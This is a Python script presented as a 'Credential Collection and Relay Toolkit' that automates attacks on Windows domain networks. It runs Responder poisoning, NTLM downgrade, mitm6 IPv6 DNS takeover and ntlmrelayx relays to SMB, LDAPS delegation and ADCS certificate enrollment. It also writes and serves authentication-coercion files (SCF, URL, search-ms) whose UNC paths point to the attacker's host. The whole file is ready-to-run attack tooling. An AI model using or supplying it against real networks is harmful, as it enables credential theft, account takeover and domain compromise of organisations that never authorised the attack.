#!/usr/bin/env python3

import os
import sys
import time
import shutil
import logging
import argparse
import netifaces
from pathlib import Path
from threading import Thread
from termcolor import colored
from subprocess import Popen, PIPE

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def check_dependencies():
    """Check if required tools are installed"""
    required_tools = {
        'nxc': 'NetExec (pipx install git+https://github.com/Pennyw0rth/NetExec.git)',
        'impacket-ntlmrelayx': 'Impacket (pipx install git+https://github.com/fortra/impacket.git)',
        'responder': 'Responder (pipx install git+https://github.com/lgandx/Responder.git)',
        'mitm6': 'mitm6 (pipx install mitm6)',
        'certipy': 'Certipy (pipx install git+https://github.com/ly4k/Certipy.git)'
    }
    
    missing_tools = []
    for tool, install_info in required_tools.items():
        if not shutil.which(tool):
            missing_tools.append(f"{tool} - {install_info}")
    
    if missing_tools:
        print(colored("\nMissing required tools:", 'red'))
        for tool in missing_tools:
            print(colored(f"[-] {tool}", 'red'))
        print("\nPlease run the install script before continuing.")
        sys.exit(1)

class CoerceTemplates:
    """Templates for authentication coercion"""
    
    # WebDAV search connector template 
    SEARCH_MS = """<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<iconReference>imageres.dll,-1002</iconReference>
<folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
<simpleLocation>
<url>\\\\{server}\\share\\</url>
</simpleLocation>
</searchConnectorDescription>"""

    # SCF file template
    SCF = """[Shell]
Command=2
IconFile=\\\\{server}\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop"""

    # URL shortcut template 
    URL = """[InternetShortcut]
URL=file://{server}/share/
IconFile=\\\\{server}\\share\\icon.ico
IconIndex=1"""

    # Print notification template
    PRINT = """<?xml version="1.0" encoding="UTF-8"?>
<descendantfonts>
<print>
<properties xmlns="http://schemas.microsoft.com/windows/2006/propertiesschema">
<property name="System.ItemNameDisplay">\\\\{server}\\share\\file</property>
</properties>
</print>
</descendantfonts>"""

class CredentialToolkit:
    def __init__(self, args):
        self.args = args
        self.iface = args.interface or self.get_default_interface()
        self.local_ip = self.get_local_ip(self.iface)
        self.processes = []
        self.templates = CoerceTemplates()
        self.http_server = None
        
    def get_default_interface(self):
        """Get default network interface"""
        return netifaces.gateways()['default'][netifaces.AF_INET][1]

    def get_local_ip(self, iface):
        """Get local IP address"""
        return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']

    def setup_coercion_files(self):
        """Generate authentication coercion files"""
        try:
            web_dir = Path('web')
            web_dir.mkdir(exist_ok=True)
            
            files = {
                'search.search-ms': self.templates.SEARCH_MS,
                'share.scf': self.templates.SCF,
                'share.url': self.templates.URL,
                'print.xml': self.templates.PRINT
            }
            
            for filename, template in files.items():
                try:
                    content = template.format(server=self.local_ip)
                    (web_dir / filename).write_text(content)
                except Exception as e:
                    self.print_bad(f"Error creating {filename}: {str(e)}")
                    continue
            
            self.print_good(f"Generated coercion files in {web_dir}")
            return True
        except Exception as e:
            self.print_bad(f"Error in setup_coercion_files: {str(e)}")
            return False

    def find_relay_targets(self):
        """Find potential relay targets (SMB signing disabled)"""
        try:
            self.print_info("Finding relay targets...")
            cmd = f"nxc smb {self.args.target_range} --gen-relay-list targets.txt"
            proc = self.run_command(cmd)
            proc.wait()
            return Path('targets.txt').exists()
        except Exception as e:
            self.print_bad(f"Error finding relay targets: {str(e)}")
            return False

    def edit_responder_conf(self):
        """Configure Responder settings"""
        try:
            conf_path = Path('/usr/share/responder/Responder.conf')
            if not conf_path.exists():
                self.print_bad("Responder.conf not found")
                return False
                
            content = conf_path.read_text()
            protocols = ['HTTP', 'SMB'] if self.args.relay else []
            for proto in protocols:
                content = content.replace(f"{proto} = On", f"{proto} = Off")
            
            conf_path.write_text(content)
            if protocols:
                self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols)}")
            return True
        except Exception as e:
            self.print_bad(f"Error editing Responder.conf: {str(e)}")
            return False

    def start_responder(self):
        """Start Responder for hash capture"""
        try:
            cmd = f'responder -I {self.iface} -wv'
            if self.args.analyze:
                cmd += ' -A'
            if self.args.challenge:
                cmd += f' --lm --disable-ess'
            if self.args.dhcp:
                cmd += ' -d'
            return self.run_command(cmd)
        except Exception as e:
            self.print_bad(f"Error starting Responder: {str(e)}")
            return None

    def start_ntlmrelay(self):
        """Start ntlmrelayx with appropriate options"""
        try:
            if not self.args.relay:
                return None
                
            options = [
                '-tf', 'targets.txt',
                '-smb2support'
            ]

            if self.args.socks:
                options.append('-socks')
            
            if self.args.relay_type:
                if self.args.relay_type == 'ldaps':
                    options.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
                elif self.args.relay_type == 'smb':
                    options.extend(['--no-http-server', '--no-smb-server'])
                elif self.args.relay_type == 'adcs':
                    options.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])

            cmd = f'impacket-ntlmrelayx {" ".join(options)}'
            return self.run_command(cmd)
        except Exception as e:
            self.print_bad(f"Error starting NTLM relay: {str(e)}")
            return None

    def start_mitm6(self):
        """Start mitm6 for IPv6 poisoning"""
        try:
            if not self.args.ipv6 or not self.args.domain:
                return None
                
            cmd = f'mitm6 -d {self.args.domain} -i {self.iface}'
            return self.run_command(cmd)
        except Exception as e:
            self.print_bad(f"Error starting mitm6: {str(e)}")
            return None

    def start_http_server(self):
        """Start HTTP server for coercion files"""
        try:
            web_dir = Path('web')
            if not web_dir.exists():
                self.print_bad("Web directory not found")
                return None

            os.chdir(str(web_dir))
            from http.server import HTTPServer, SimpleHTTPRequestHandler
            server = HTTPServer(("", self.args.port), SimpleHTTPRequestHandler)
            server_thread = Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            self.print_good(f"Started HTTP server on port {self.args.port}")
            return server
        except Exception as e:
            self.print_bad(f"Error starting HTTP server: {str(e)}")
            return None

    def run_command(self, cmd):
        """Execute command and return process"""
        try:
            logger.debug(f"Running command: {cmd}")
            proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
            self.processes.append(proc)
            return proc
        except Exception as e:
            self.print_bad(f"Error running command '{cmd}': {str(e)}")
            return None

    def auto_attack(self):
        """Run automated attack sequence"""
        try:
            self.print_info("Starting automated attack sequence...")
            
            # 1. Initial recon
            self.print_info("Phase 1: Initial Reconnaissance")
            
            # Check for broadcast protocols
            self.print_info("Checking for broadcast protocols (LLMNR/NBT-NS)...")
            analyze_proc = self.run_command(f'responder -I {self.iface} -A')
            time.sleep(10)
            analyze_proc.terminate()
            
            # Find potential relay targets
            self.print_info("Scanning for relay targets...")
            nxc_proc = self.run_command(f'nxc smb {self.args.target_range} --gen-relay-list targets.txt')
            nxc_proc.wait()
            
            if Path('targets.txt').exists():
                self.print_good("Found potential relay targets")
                targets_found = True
            else:
                self.print_bad("No relay targets found")
                targets_found = False

            # Check for ADCS web endpoints
            if self.args.dc_ip:
                self.print_info("Checking for ADCS...")
                adcs_proc = self.run_command(f'nxc ldap {self.args.dc_ip} -M adcs')
                adcs_proc.wait()
            
            # 2. Setup attack infrastructure
            self.print_info("Phase 2: Setting Up Attack Infrastructure")
            
            # Configure Responder
            if not self.edit_responder_conf():
                return
                
            # Setup coercion files
            if not self.setup_coercion_files():
                return

            # Start HTTP server
            self.http_server = self.start_http_server()
            if not self.http_server:
                return
            
            # 3. Start core services
            self.print_info("Phase 3: Starting Core Services")
            responder = self.start_responder()
            
            # 4. Start relay attacks if targets found
            if targets_found:
                self.print_info("Phase 4: Starting Relay Attacks")
                
                # SMB relay with SOCKS
                ntlmrelay_smb = self.run_command(
                    'impacket-ntlmrelayx -tf targets.txt -smb2support -socks -no-http-server -no-smb-server'
                )
                
                if self.args.dc_ip:
                    # LDAPS relay for delegation
                    ntlmrelay_ldaps = self.run_command(
                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access'
                    )
                    
                    # ADCS relay
                    ntlmrelay_adcs = self.run_command(
                        f'impacket-ntlmrelayx -t http://{self.args.dc_ip}/certsrv/certfnsh.asp'
                    )
            
            # 5. Start IPv6 attack if domain specified
            if self.args.domain:
                self.print_info("Phase 5: Starting IPv6 Attack")
                mitm6_proc = self.start_mitm6()
                
                if self.args.dc_ip:
                    # Additional LDAPS relay specifically for mitm6
                    ntlmrelay_mitm6 = self.run_command(
                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access --add-computer'
                    )
            
            self.print_info("Attack infrastructure deployed - Monitoring for captures/relays")
            self.print_info(f"Coercion files available at: http://{self.local_ip}:{self.args.port}/")
            
            # Print attack summary
            self.print_info("\nActive Attack Channels:")
            self.print_info("- NetBIOS/LLMNR Poisoning")
            if targets_found:
                self.print_info("- SMB Relay with SOCKS")
                if self.args.dc_ip:
                    self.print_info("- LDAPS Delegation Attack")
                    self.print_info("- ADCS Certificate Attack")
            if self.args.domain:
                self.print_info("- IPv6 DNS Takeover")
            
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.print_info('\nStopping attack sequence...')
        except Exception as e:
            self.print_bad(f"Error in auto_attack: {str(e)}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Cleanup processes and files"""
        try:
            for proc in self.processes:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except:
                    proc.kill()

            if self.http_server:
                self.http_server.shutdown()

            # Cleanup temp files
            cleanup_files = [
                Path('web').glob('*'),
                Path('targets.txt')
            ]
            
            for pattern in cleanup_files:
                for f in Path().glob(str(pattern)):
                    try:
                        f.unlink()
                    except Exception as e:
                        logger.debug(f"Error cleaning up {f}: {str(e)}")
                        continue
        except Exception as e:
            self.print_bad(f"Error in cleanup: {str(e)}")

    def print_bad(self, msg): print(colored('[-] ', 'red') + msg)
    def print_info(self, msg): print(colored('[*] ', 'blue') + msg)
    def print_good(self, msg): print(colored('[+] ', 'green') + msg)

def parse_args():
    parser = argparse.ArgumentParser(description="Credential Collection and Relay Toolkit")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-p", "--port", type=int, default=8080, help="HTTP server port (default: 8080)")
    
    # Attack targets
    parser.add_argument("-dc", "--dc-ip", help="Domain controller IP")
    parser.add_argument("-d", "--domain", help="Domain name for IPv6/WPAD attacks")
    parser.add_argument("-tr", "--target-range", default="192.168.1.0/24", help="Target range for relay discovery")
    
    # Collection options
    parser.add_argument("-a", "--analyze", action="store_true", help="Run in analyze mode")
    parser.add_argument("-c", "--challenge", help="Custom NTLM challenge for downgrade attacks")
    parser.add_argument("--dhcp", action="store_true", help="Enable DHCP poisoning")
    
    # Relay options
    parser.add_argument("-r", "--relay", action="store_true", help="Enable NTLM relay")
    parser.add_argument("-rt", "--relay-type", choices=['smb', 'ldaps', 'adcs'], help="Relay protocol type")
    parser.add_argument("-s", "--socks", action="store_true", help="Enable SOCKS proxy")
    
    # Attack modes
    parser.add_argument("--auto", action="store_true", help="Enable automated attack sequence")
    parser.add_argument("--ipv6", action="store_true", help="Enable IPv6 attacks")
    
    return parser

def main():
    if os.geteuid():
        print(colored('[-] ', 'red') + 'Script must run as root')
        sys.exit(1)
        
    check_dependencies()
    
    parser = parse_args()
    args = parser.parse_args()
    toolkit = CredentialToolkit(args)

    if args.auto:
        toolkit.auto_attack()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()